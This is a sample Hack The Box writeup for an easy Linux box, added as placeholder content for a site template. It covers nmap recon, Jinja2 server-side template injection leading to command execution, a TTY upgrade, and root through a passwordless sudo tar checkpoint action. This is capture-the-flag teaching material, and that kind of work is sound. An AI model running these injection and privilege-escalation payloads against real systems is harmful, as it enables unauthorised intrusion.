@@ -1,0 +1,88 @@
+---
+title: "Dojo — HTB Writeup"
+description: "Easy Linux box: SSTI in a Flask app to a foothold, then a sudo misconfig to root."
+pubDate: 2026-05-28
+tags: ["linux", "ssti", "flask", "sudo", "privesc"]
+machine: "Dojo"
+os: "Linux"
+difficulty: "Easy"
+platform: "Hack The Box"
+techniques: ["SSTI", "sudo abuse", "Python jinja2"]
+retired: true
+draft: false
+---
+
+import Callout from '../../components/Callout.astro';
+
+> This is a **sample writeup** so you can see the layout, metadata box, table of
+> contents, code blocks, and callouts. Delete it and drop your real writeups in
+> `src/content/htb/`.
+
+## Recon
+
+Start with a full TCP port sweep, then service/version detection on the open ports.
+
+```bash
+nmap -p- --min-rate 10000 -T4 10.10.11.42 -oN nmap/all-ports.txt
+nmap -p 22,80 -sCV 10.10.11.42 -oN nmap/services.txt
+```
+
+Two ports: OpenSSH on 22 and a Werkzeug/Flask dev server on 80.
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Werkzeug/2.3.7 Python/3.11.4
+```
+
+## Foothold — Server-Side Template Injection
+
+The `/greet?name=` parameter is reflected into a Jinja2 template. The classic
+polyglot confirms evaluation server-side:
+
+```
+GET /greet?name={{7*7}}  →  "Hello 49"
+```
+
+<Callout type="exploit" title="RCE via Jinja2">
+Walk the object graph to a `subprocess`/`os` reference and execute commands:
+
+```python
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+```
+</Callout>
+
+Spawn a reverse shell, then upgrade the TTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Privilege Escalation
+
+`sudo -l` shows the `www-data` user can run `tar` as root with no password:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/tar
+```
+
+<Callout type="warning" title="GTFOBins">
+`tar` has a checkpoint action that runs an arbitrary command — straight to root.
+</Callout>
+
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+# whoami → root
+```
+
+## Loot
+
+```bash
+cat /root/root.txt
+```
+
+## Takeaways
+
+- Any user-controlled value rendered through a template engine is an SSTI candidate.
+- Always run `sudo -l` early — and cross-reference every binary against GTFOBins.
